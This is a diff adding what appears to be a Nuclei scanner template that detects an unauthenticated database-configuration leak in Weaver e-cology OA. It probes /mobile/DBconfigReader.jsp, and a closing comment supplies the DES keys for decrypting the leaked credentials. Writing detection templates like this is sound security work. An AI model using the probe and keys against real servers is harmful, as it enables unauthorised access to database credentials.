@@ -1,0 +1,42 @@
+id: fanweiOA-E-Cology-DBconfigReader_jsp-dbconfig-leak
+
+info:
+  name: 泛微 e-cology OA 数据库配置信息泄露漏洞复现
+  author: cnaq
+  severity: medium
+  description: 泛微e-cology OA系统/mobile/DBconfigReader.jsp存在未授权访问，通过解密，可直接获取数据库配置信息。已知为8.100.0531版本
+  reference:
+    - https://www.cnblogs.com/mark-zh/p/11758171.html
+    - https://www.modb.pro/db/128902
+    - https://github.com/jas502n/DBconfigReader
+    - https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg
+  tags: fanwei,oa,ecology,info
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/DBconfigReader.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Login.jsp"
+        part: body
+        condition: and
+        negative: true
+      
+      - type: dsl
+        dsl:
+          - 'len(body)>32&&len(body)<512' # 加密后的长度在100左右，根据返回长度减少误报
+
+    # extractors:
+    #   - type: dsl 
+    #     dsl:
+    #       - "base64(trim(body,'\r\n'))"
+
+# DES解密密钥 key1 = "1z2x3c4v"; key1 = "1z2x3c4v5b6n"; 模式 m=ecb,pad=zero,p=1z2x3c4v,o=0,s=gb2312
